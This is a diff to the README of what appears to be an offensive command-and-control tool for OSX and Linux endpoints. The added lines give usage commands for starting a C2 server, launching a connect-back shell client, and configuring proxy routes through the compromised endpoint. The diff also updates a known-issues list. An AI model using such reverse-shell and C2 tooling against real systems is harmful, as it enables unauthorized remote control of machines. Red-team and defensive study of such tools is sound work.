@@ -26,6 +26,27 @@
 * (new) Supports proxy of TCP traffic from both client/server end for multiple routes
 * Tested on Arch/Kali/Ubuntu and OSX
 
+### Usage:
+
+```
+./server [port] - start c2 server (default port is 443)
+./client [ip] [port] - launch connect back shell (default is 127.0.0.1:443)
+```
+
+To configure proxy routes edit '.proxies' in server directory. 
+An example is provided below:
+
+```
+# .proxies example file
+# <src_port> <dst_ip> <dst_port>
+
+# example route 1
+1337 127.0.0.1 9447
+
+# example route 2
+9001 192.168.1.112 9002
+```
+
 ### Goals:
 * (done) OSX or Linux endpoint control
 * (done) Connects back and provides a shell to a hardcoded C2
@@ -38,8 +59,7 @@
 * (done) Ability to proxy traffic through endpoint
 
 ### Known Issues:
-* Infinite loop bug related to window sizing
-* Proxy connection not being torn down if remote peer disconnects
+* No window refresh after resizing. (issues with ncurses SIGWINCH handling atm)
 
 ### Screenshots:
 
